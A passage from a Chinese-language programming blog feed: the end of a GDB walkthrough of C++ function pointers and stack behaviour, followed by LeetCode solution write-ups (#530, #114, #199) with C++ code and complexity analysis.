<code>func_ptr</code> 的值，看它是否指向了 <code>add</code> 函數的地址，<strong>而結果顯然是真的指向到  <code>add</code> 函數的記憶體位址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print func_ptr</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1 = (int (*)(int, int)) 0x5555555551c9 &lt;add(int, int)&gt;</span><br></pre></td></tr></table></figure><p>接著可以執行 <code>r</code> 繼續執行到下一個斷點，也就是將 function pointer 賦值給 subtract 函數的地方</p><p>接著一路單步執行到 <code>func_ptr = &amp;subtract;</code> 那行，接著再 <code>print func_ptr</code></p><p><img src="/img/c++/gdb4.png"></p><p>一樣可以看到這行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x555555555221 &lt;main()+42&gt;:  lea    rax,[rip+0xffffffffffffffb9]        # 0x5555555551e1 &lt;_Z8subtractii&gt;</span><br></pre></td></tr></table></figure><p>這裡也是將 <code>subtract</code> 函數位址載入到 <code>RAX</code> 中，我們可以輸入 <code>n</code> 看下一個指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x55555555522c &lt;main()+53&gt;:  mov    rax,QWORD PTR [rbp-0x8]</span><br></pre></td></tr></table></figure><p>這行會做的事情就是跟剛剛一樣，<strong>將 <code>rax</code> 中的值存入 function pointer 的所在位址</strong></p><p>接著我們進入下一行指令，可以透過 <code>n</code> 指令來追蹤第22行，函數執行完並且輸出結果</p><p>我們這時候也可以檢查 function pointer 是否指向 <code>subtract</code> 函數的記憶體位址</p><p><img src="/img/c++/gdb5.png"></p><p>而這個答案也是肯定的。而如果我們執行到 <code>int result1 = func_ptr(10, 5);</code> 這時也可以觀察一下暫存器的變化，如果覺得畫面太亂，可以用下面指令來查看暫存器的狀態， <code>RIP</code> 代表下一個要執行的CPU指令，而 <code>RSP</code> 則是 Stack Pointer 代表當前 stack frame 的上緣，可以透過這兩個 register 來了解 function call 時候的流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info registers </span><br></pre></td></tr></table></figure><p><img src="/img/c++/gdb6.png"></p><p>這是進入 <code>add</code> 之前的 <code>rip</code> 和 <code>rsp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsp            0x7fffffffdfb0      0x7fffffffdfb0</span><br><span class="line">rip            0x55555555520e      0x55555555520e &lt;main()+23&gt;</span><br></pre></td></tr></table></figure><p>而這是進入 <code>add</code> 之後的 <code>rip</code> 和 <code>rsp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsp            0x7fffffffdfa0      0x7fffffffdfa0</span><br><span class="line">rip            0x5555555551d7      0x5555555551d7 &lt;add(int, int)+14&gt;</span><br></pre></td></tr></table></figure><p>可以觀察到，Stack 大概差了2 bytes，這兩byte 也可以從 stack 視圖中觀察到:</p><p>這是進入 <code>add</code> 之前:</p><p><img src="/img/c++/stack1.png"></p><p>這是進入 <code>add</code> 之後:<br><img src="/img/c++/stack2.png"></p><p>這之2 bytes 其中包含了 回到 <code>main</code> 的 return address  <code>0x55555555521e</code>。 這時我們繼續執行 <code>s</code> 直到跳回 <code>main</code> 函數，可以從 code section 看到我們正在剛剛函數 return address 的下一個指令位址 <code>0x555555555221</code>。</p><p>最後執行 <code>print result1</code> 察看結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0xf</span><br></pre></td></tr></table></figure><p>也代表結果 15</p><blockquote><p>這時實驗也更了解 function pointer 還有function call 期間的記憶體變化</p></blockquote><h2 id="觀念澄清"><a href="#觀念澄清" class="headerlink" title="觀念澄清"></a>觀念澄清</h2><p><img src="/img/c++/memory.png"></p><p>在 C&#x2F;C++ 中，pointer變數的記憶體位址存放在哪個地方取決於它是怎麼被宣告的，</p><ul><li>如果 pointer 是在函數內部宣告的local variable，像是 <code>int *ptr;</code> 那pointer本身會被存放在 Stack</li><li>如果 pointer是一塊隨機的記憶體位址，如果你是用動態宣告 <code>int *ptr = new int</code>，那pointer本身還是會在 Stack 或global 但所指向的對象會是在 heap上</li><li>如果宣告的 pointer 是global的，那他就會被存放在 global&#x2F;staic 區域中，如果是靜態變數一樣 <code>static int* ptr</code></li><li>Pointer 本身不會被存放在 code 區域，但 Function Pointer 會指向 code 區域中的函數入口點<ul><li><code>void (*func_ptr)() = &amp;myFunction;</code> 這個 pointer 儲存的值 (函數位址) 會是在 code section，而 pointer本身還是會是 stack 或是 gloal&#x2F;stack 區段。</li></ul></li></ul><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>更加了解了 function pointer 對應到的記憶體變化，之後有機會再實際透過 Function Pointer來實現 Function Table。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] - <a href="https://medium.com/@hatronix/function-pointers-in-c-unleashing-the-power-of-dynamic-dispatch-29672ffcf502">https://medium.com/@hatronix/function-pointers-in-c-unleashing-the-power-of-dynamic-dispatch-29672ffcf502</a><br>[2] - <a href="https://www.boardinfinity.com/blog/function-pointers-in-c/">https://www.boardinfinity.com/blog/function-pointers-in-c/</a><br>[3] - <a href="https://www.javatpoint.com/function-pointer-in-cpp">https://www.javatpoint.com/function-pointer-in-cpp</a><br>[4] - <a href="https://www.geeksforgeeks.org/function-pointer-in-cpp/">https://www.geeksforgeeks.org/function-pointer-in-cpp/</a><br>[5] - <a href="https://kheresy.wordpress.com/2010/11/03/function_pointer/">https://kheresy.wordpress.com/2010/11/03/function_pointer/</a><br>[6] - <a href="https://chenhh.gitbooks.io/parallel_processing/content/cython/function_pointer.html">https://chenhh.gitbooks.io/parallel_processing/content/cython/function_pointer.html</a><br>[7] - <a href="https://www.youtube.com/watch?v=ynYtgGUNelE">https://www.youtube.com/watch?v=ynYtgGUNelE</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Pointer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BST 中的最小節點差值 | Easy| LeetCode#530. Minimum Absolute Difference in BST</title>
      <link href="/posts/9f5948c3.html"/>
      <url>/posts/9f5948c3.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/530/question.jpeg"></p><p><img src="/img/LeetCode/530/question2.jpeg"></p><ul><li>題目難度： <code>Easy</code></li><li>題目敘述： 給定一個 Binary Search Tree (BST) 的 <code>root</code> ，回傳樹中任意兩個節點的絕對值當中最小的。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>首先 Binary Search Tree 的特性就是對於任意節點， <strong>其左子樹必定 &lt; 當前節點 &lt; 右子樹。</strong></p><p><strong>因此可以判斷，在對這顆樹進行 Inorder Traversal 的過程中，相鄰節點的差值會是最小的，不存在跨一個節點之間差值更小的問題</strong></p><p>所以基本上我的想法就是跑一遍 Inorder Traversal，將節點記錄到一個 list，在 list 中再計算差值．但這樣缺點就是 runtime 會增加。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; nodes;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; nodeDifferences;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator result;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">inorder</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current== <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(current-&gt;left);</span><br><span class="line">        nodes.<span class="built_in">push_back</span>(current-&gt;val);</span><br><span class="line">        <span class="built_in">inorder</span>(current-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">inorder</span>(root);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt; nodes.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            nodeDifferences.<span class="built_in">push_back</span>(<span class="built_in">abs</span>(nodes[i]-nodes[i<span class="number">-1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="built_in">min_element</span>(nodeDifferences.<span class="built_in">begin</span>(), nodeDifferences.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> *result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面在 <code>void inorder(TreeNode *current)</code> 中紀錄了節點值，記錄完畢後回到 caller <code>int getMinimumDifference(TreeNode* root)</code> 這時候依序將相鄰節點差值計算出。</p><p>最後透過一格 <code>vector iterator</code> 去找回傳list當中最小的值。</p><blockquote><p>要使用這個 iterator 必須 include 標頭 <code>&lt;algorithm&gt;</code></p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/530/result.jpeg"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> diff = INT_MAX;</span><br><span class="line">    TreeNode *prev = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode* current)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(current-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(prev!= <span class="literal">nullptr</span>) diff = <span class="built_in">min</span>(diff, <span class="built_in">abs</span>(current-&gt;val - prev-&gt;val));</span><br><span class="line">        prev = current;</span><br><span class="line">        <span class="built_in">dfs</span>(current-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> diff;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡首先初始化一個變數 <code>diff</code> 為  <code>INT_MAX</code></p><div class="note info flat"><p><strong>INT_MAX</strong> 是C&#x2F;C++ 中的一個巨集，定義了變數可以儲存但不能超過的上限</p><ul><li>INT_MAX &#x3D; 2147483647   (for 32-bit Integers)</li><li>INT_MAX &#x3D; 9,223,372,036,854,775,807   (for 64-bit Integers)</li></ul></div><p>這裡另外宣告一個節點，用來儲存 traversal 的時候的上一個節點，每次拜訪當前節點時，會與上一個節點值相減並且取絕對值，看結果與到目前為止的最小差值 <code>diff</code> 相比看看誰小，並更新到 <code>diff</code></p><p>在準備進入右子樹前，將 <code>prev</code> 變更為當前節點。</p><blockquote><p>這樣的執行結果， Runtime 明顯比原先的做法好得多</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/530/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>第一種做法：</p><ul><li>inorder traversal: $O(N)$</li><li>計算節點差值的迴圈: $O(N)$</li><li>min_element: $O(N)$</li></ul><p>整體而言：$O(N)$ +$O(N)$+$O(N)$ &#x3D; $O(N)$ </p><p>第二種做法：<br>$O(N)$，$N$ 為節點個數</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>第一種做法： $O(N)$ +$O(N)$+$O(H)$ &#x3D; $O(N)$ </p><p>第二種做法：<br>$O(H)$，$H$ 為樹高，worst case 會是 $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Traversal </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>將二元樹展平為Linked List| Medium | LeetCode#114. Flatten Binary Tree to Linked List</title>
      <link href="/posts/f15c47a9.html"/>
      <url>/posts/f15c47a9.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/114/question.png"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述：給定一棵 Binary Tree 的 <code>root</code>，將 Binary tree 展平成一個 Linked List</li></ul><div class="note info flat"><ul><li>Linked List 要與題目的 <code>TreeNode</code> 是相同的 class，<code>right</code> child pointer 要指向list中的下一個節點，而 <code>left</code> child pointer 皆指向null</li><li><strong>Linked List 節點順序要與對這棵樹進行 Pre-order Traversal 的節點順序一樣</strong></li></ul></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>這題的想法沒有花很久時間，算是解到目前最快的一題，大概從有想法到AC大概20min</p></blockquote><p>這題的目的是要將一棵任意的二元樹轉換為一個往右側節點生長的Linked List (其實就是 skewed tree)。我一開始的想法如下：</p><p><img src="/img/LeetCode/114/algo1.png"></p><p>首先宣告一個指標，用來指向 right subTree 的 root，走到任意節點時，如果他的左子樹存在，就將其左子樹嫁接到當前節點的右子樹位置，但這樣原先的右子樹怎辦？這就是剛剛要宣告一個新指標的原因。<strong>接著嫁接完畢後就將原本 right subTree 的 root 接回來，接著持續在右子樹 traversal，一旦發現有節點具有 Left-child 則重複剛剛的步驟。</strong></p><p><img src="/img/LeetCode/114/algo2.png"></p><blockquote><p>當然這個初始的想法後續再寫的過程中也有進行修改，成果如下：</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">flatten</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        TreeNode *current = root;</span><br><span class="line">        TreeNode *ptr = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;left!= <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ptr = current -&gt; right;</span><br><span class="line">            current -&gt; right = current -&gt; left;</span><br><span class="line">            current -&gt; left = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(current-&gt;right != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                current = current -&gt; right;</span><br><span class="line">            &#125;</span><br><span class="line">            current -&gt; right = ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">flatten</span>(root-&gt;right);  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>一旦有left child，那就將 <code>ptr</code> 指標指向當前節點的 right-child</li><li>將左子樹嫁接到右子樹： <code>current -&gt; right = current -&gt; left</code></li><li>將  <code>current-&gt;left</code> 指向 nullptr</li><li>接著沿著新的右子樹一路往下走，走到 rightmost child，將原本的右子樹接回來 <code>current -&gt; right = ptr</code></li><li>接著從 <code>root</code> 的右側節點一路遞迴檢查有無左子樹存在，有就嫁接</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/114/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$，$N$ 為節點數量。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(h)$，$h$ 為Binary Tree的高度，最壞狀況下為 $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Medium </tag>
            
            <tag> Traversal </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹的右視圖 | Medium | LeetCode#199. Binary Tree Right Side View</title>
      <link href="/posts/88663fd5.html"/>
      <url>/posts/88663fd5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/199/question.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 這題要求給定一個 Binary Tree 的 <code>root</code>，請想像站在樹的右側，由上而下將節點列出。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我一開始直接理解錯題目，我以為題目要我們想像站在樹右側是正面面對樹，然後朝向右半側，所以覺得題目只是要我們列出除了ROOT之外右邊子樹的所有節點，<strong>但其實是要站在樹的右邊面向樹，由上往下看，因此有被遮擋住的節點就不會回傳。</strong></p><p><img src="/img/LeetCode/199/tree.png"></p><p>所以如果是上面這棵樹，則會印出 [1,3,4]</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; result = &#123;&#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">rightSideView</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span> result;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="comment">//push root</span></span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span> levelsize = q.<span class="built_in">size</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; levelsize ;i++)&#123;</span><br><span class="line">                TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>) result.<span class="built_in">push_back</span>(current-&gt;val);</span><br><span class="line">                <span class="keyword">if</span>(current-&gt;right) q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">                <span class="keyword">if</span>( current-&gt;left) q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這題就是BFS，只不過右邊的重要性高於左邊，因此調整了push進入queue的順序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(current-&gt;right) q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line"><span class="keyword">if</span>( current-&gt;left) q.<span class="built_in">push</span>(current-&gt;left);</span><br></pre></td></tr></table></figure><p>但如果只是按照這樣寫，那也是所有節點都會 traverse 到，如果是上面那棵樹，就會輸出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 3 2 4</span><br></pre></td></tr></table></figure><p>這裡可以知道， <strong>如果同一層中最右側的節點已經存在，那其餘節點就不需要添加到回傳 vector 中。</strong> 因此接下來的關鍵是 <strong>判斷層</strong></p><p>在 <a href="https://leozzmc.github.io/posts/db053989.html">之前的題目中</a> 已經有做過在BFS的過程中判斷層數，基本框架是像下面這樣:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> level = q.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;level; i++)&#123;</span><br><span class="line">    TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡我們如法炮製，由於我們會優先traverse 右子樹，因此我們可以 <strong>在迴圈中的第一圈就先將節點值寫入回傳vector中。</strong></p><p>這裡也可以用正常BFS的順序，只不過就需要改成，將最後一次迴圈值寫入回傳vector中。</p><p>最後回傳 vector 則AC。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/199/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>因為 traverse 了所有節點，因此 $O(N)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li><code>result</code>: $O(H)$，$H$ 為樹的高度</li><li><code>queue&lt;TreeNode*&gt; q</code>: worst case: $O(N)$</li></ul><p>因此整體也會是 $O(N)$</p>]]></content>
      
      
      <categories>
          
